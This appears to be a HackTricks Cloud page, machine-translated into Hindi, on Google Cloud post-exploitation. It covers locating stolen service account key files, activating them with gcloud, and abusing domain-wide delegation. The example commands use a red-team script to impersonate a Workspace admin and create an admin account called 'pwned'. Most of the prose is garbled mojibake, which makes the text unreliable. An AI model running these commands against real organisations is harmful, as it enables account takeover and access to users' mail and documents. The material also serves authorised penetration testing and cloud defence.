рдпреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рдХрдВрдкреНрдпреВрдЯ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реЛрдирд╛ рд╣реЛрдЧрд╛ред рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд╛рдо `[рдкреНрд░реЛрдЬреЗрдХреНрдЯ-рдЖрдИрдбреА]-[рдХреБрдВрдЬреА-рдЖрдИрдбреА-рдХрд╛-рднрд╛рдЧ].json` рд╣реЛрддрд╛ рд╣реИред рддреЛ, рдпрджрд┐ рдЖрдкрдХрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдирд╛рдо `рдЯреЗрд╕реНрдЯ-рдкреНрд░реЛрдЬреЗрдХреНрдЯ` рд╣реИ, рддреЛ рдЖрдк рдЗрд╕ рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ `рдЯреЗрд╕реНрдЯ-рдкреНрд░реЛрдЬреЗрдХреНрдЯ*.json` рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХреА рд╣реЛрддреА рд╣реИ:
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
рдпрд╛, рдпрджрд┐ **CLI рд╕реЗ рдЙрддреНрдкрдиреНрди** рд╣реЛрдВрдЧреЗ рддреЛ рд╡реЗ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдВрдЧреЗ:
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрдЬрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **`gcloud` рдХрдорд╛рдВрдб рдХреЛ рдЗрд╕ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рд╛рде рдкреБрдирдГ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдХрд┐рд╕реА рднреА рдорд╢реАрди рдкрд░ рдЬрд┐рд╕рдореЗрдВ рдпреЗ рдЙрдкрдХрд░рдг рд╕реНрдерд╛рдкрд┐рдд рд╣реИрдВред
```bash
gcloud auth activate-service-account --key-file [FILE]
```
рдЖрдк рдЕрдм рдЕрдкрдиреЗ рдирдП OAuth рдЯреЛрдХрди рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ **рдЯреЗрд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
рдЖрдкрдХреЛ рд╕реНрдХреЛрдк рдореЗрдВ `https://www.googleapis.com/auth/cloud-platform` рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдкрдХреЛ **рдХрд┐рд╕реА рднреА рдЗрдВрд╕реНрдЯреЗрдВрд╕-рд╕реНрддрд░реАрдп рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдк рд╕реЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рднреА рдЖрдкрдХреЗ рдЖрдИрдПрдПрдо рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдкреВрд░рд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИред

## рдбреЛрдореЗрди-рд╡рд╛рдЗрдб рдЕрдзрд┐рдХрд╛рд░ рджреНрд╡рд╛рд░рд╛ Workspace рдореЗрдВ рдлреИрд▓рд╛рдирд╛ <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) рдЧреВрдЧрд▓ рдХрд╛ **рд╕рд╣рдпреЛрдЧ рдФрд░ рдЙрддреНрдкрд╛рджрдХрддрд╛ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЬреАрдореЗрд▓, рдЧреВрдЧрд▓ рдХреИрд▓реЗрдВрдбрд░, рдЧреВрдЧрд▓ рдбреНрд░рд╛рдЗрд╡, рдЧреВрдЧрд▓ рдбреЙрдХреНрд╕ рдЖрджрд┐ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

GCP рдореЗрдВ **рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдХреЛ рдпреЛрдЧреНрдпрддрд╛ рд╣реИ рдХрд┐ рд╡реЗ рд╡реЙрд░реНрдХрд╕реНрдкреЗрд╕ рдореЗрдВ рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рднреВрдорд┐рдХрд╛ рдореЗрдВ рдЕрд╡рддрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ [рдбреЛрдореЗрди-рд╡рд╛рдЗрдб рдЕрдзрд┐рдХрд╛рд░](https://developers.google.com/admin-sdk/reports/v1/guides/delegation) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ GMail рдореЗрдВ **рдИрдореЗрд▓ рдкрдврд╝рдирд╛**, Google Docs рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдФрд░ рдЬреА рд╕реНрд╡реАрдЯ рд╕рдВрдЧрдарди рдореЗрдВ рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдмрдирд╛рдирд╛ рдЬреИрд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

Workspace рдХреЗ рдкрд╛рд╕ [рдЕрдкрдирд╛ рдПрдкреАрдЖрдИ](https://developers.google.com/gsuite/aspects/apis) рд╣реИ, рдЬреЛ GCP рд╕реЗ рдкреВрд░реА рддрд░рд╣ рдЕрд▓рдЧ рд╣реИред рдЕрдиреБрдорддрд┐рдпрд╛рдБ Workspace рдХреЛ рджреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ **GCP рдФрд░ Workspace рдХреЗ рдмреАрдЪ рдХреЛрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрдмрдВрдз рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ рд╕рдордп рд╡реЗрдм рдпреВрдЖрдИ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк **рдЖрдИрдПрдПрдо -> рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЦрд╛рддреЗ рдореЗрдВ **"рдбреЛрдореЗрди-рд╡рд╛рдЗрдб рдЕрдзрд┐рдХрд╛рд░" рд╕реНрддрдВрдн рдХреЗ рддрд╣рдд "рд╕рдХреНрд╖рдо" рджрд░реНрдЬ рд╣реИ**ред рдпрджрд┐ рдХреЛрдИ рдЦрд╛рддреЗ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ рддреЛ рд╕реНрддрдВрдн рдЦреБрдж рдирд╣реАрдВ рджрд┐рдЦреЗрдЧрд╛ (рдЖрдк рдЗрд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХрд╛ рд╡рд┐рд╡рд░рдг рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ)ред рдЗрд╕ рд▓реЗрдЦ рдХреЗ рд▓реЗрдЦрди рдХреЗ рд╕рдордп, рдЗрд╕реЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиреАрдп рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЧреВрдЧрд▓ рдХреЗ рдмрдЧ рдЯреНрд░реИрдХрд░ рдореЗрдВ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ [рдЕрдиреБрд░реЛрдз](https://issuetracker.google.com/issues/116182848) рд╣реИред

рдЗрд╕ рд╕рдВрдмрдВрдз рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **GCP рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рд╡рд░реНрдХрдлрд╝реЛрд░реНрд╕ рдореЗрдВ рднреА рд╕рдХреНрд╖рдо рдХрд░рдирд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИред

#### Workspace рдЙрдкрдпреЛрдЧ рдХреА рдкрд░реАрдХреНрд╖рдг

рдЗрд╕ рдЙрдкрдпреЛрдЧ рдХреА рдкрд░реАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **JSON рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХреА рдЧрдИ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЖрдкрдиреЗ рд╢рд╛рдпрдж рдкрд╣рд▓реЗ рдХрджрдо рдореЗрдВ рдЗрдиреНрд╣реЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реЛрдЧрд╛, рдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдм рдЙрди рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рдирдореЗрдВ рдЖрдкрдХреЛ рдбреЛрдореЗрди-рд╡рд╛рдЗрдб рдЕрдзрд┐рдХрд╛рд░ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдХрд╛ рдЬреНрдЮрд╛рди рд╣реЛред

рдпрд╣ рд╡рд┐рд╖рдп рдереЛрдбрд╝рд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рд╣реИ... рдЖрдкрдХреЗ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдореЗрдВ рдХреБрдЫ рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ "client\_email" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕реЗ рдирд┐рд░реНрдпрд╛рдд рдХреА рдЧрдИ JSON рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╢рд╛рдпрдж рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реЛрдЧрд╛ `account-name@project-name.iam.gserviceaccount.com`ред рдпрджрд┐ рдЖрдк рдЗрд╕ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рд╣реА рдбреАрд▓реАрдЧреЗрд╢рди рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде рд╡рд░реНрдХрдлрд╝реЛрд░реНрд╕ рдПрдкреАрдЖрдИ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрд╕рдлрд▓ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рд╡рд░реНрдХрдлрд╝реЛрд░реНрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ GCP рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред рдмрдЬрд╛рдп рдЗрд╕рдХреЗ, рд╡рд░реНрдХрдлрд╝реЛрд░реНрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдорд╛рдиреНрдп рд╡рд░реНрдХрдлрд╝реЛрд░реНрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЕрд╡рддрд░рдг рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рдПрдХ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрд╡рддрд░рдг рдХрд░реЗрдВ**, рдФрд░ рдлрд┐рд░ рдЙрд╕ рдкрд╣реБрдВрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдРрд╕рд╛ рдХрд░реЗрдВ рдЬреИрд╕реЗ рдХрд┐ **рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд░реЗрдВ, рдмрд╣реБ-рдХрд╛рд░рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ, рдпрд╛ рдмрд╕ рдЦреБрдж рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВ**ред

Gitlab рдиреЗ [рдЗрд╕ Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) рдХреЛ рдмрдирд╛рдпрд╛ рд╣реИ рдЬреЛ рджреЛ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рдмрдирд╛рдПрдБ рдФрд░ рдПрдХ рдирдпрд╛ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЦрд╛рддрд╛ рдмрдирд╛рдПрдБред рдпрд╣рд╛рдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реНрд░реЗрдгреА рдХреЗ рдИрдореЗрд▓ рдкрддреЛрдВ рдкрд░ рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕реНрдЯреИрдВрдбрд░реНрдб рдЖрдЙрдЯрдкреБрдЯ рдпрд╣ рджрд┐рдЦрд╛рдПрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рдХрд╛рд░реНрдпрдмрд▓ рд╣реИ рдФрд░ рдпрджрд┐ рдПрдХ рдирдпрд╛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕рдореЗрдВ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ред

рдпрджрд┐ рдЖрдк рдПрдХ рдирдпрд╛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [Google рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХрдВрд╕реЛрд▓](https://admin.google.com) рдкрд░ рд▓реЙрдЧ рдЗрди рдХрд░рдХреЗ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП G Suite рдореЗрдВ рд╕рднреА рдЪреАрдЬреЛрдВ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ - рдИрдореЗрд▓, рджрд╕реНрддрд╛рд╡реЗрдЬрд╝, рдХреИрд▓реЗрдВрдбрд░, рдЖрджрд┐ред рдЖрдк рдЬрдмрд░рджрд╕реНрддреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **рдореБрдЭреЗ** рдЯреНрд╡рд┐рдЯрд░ рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
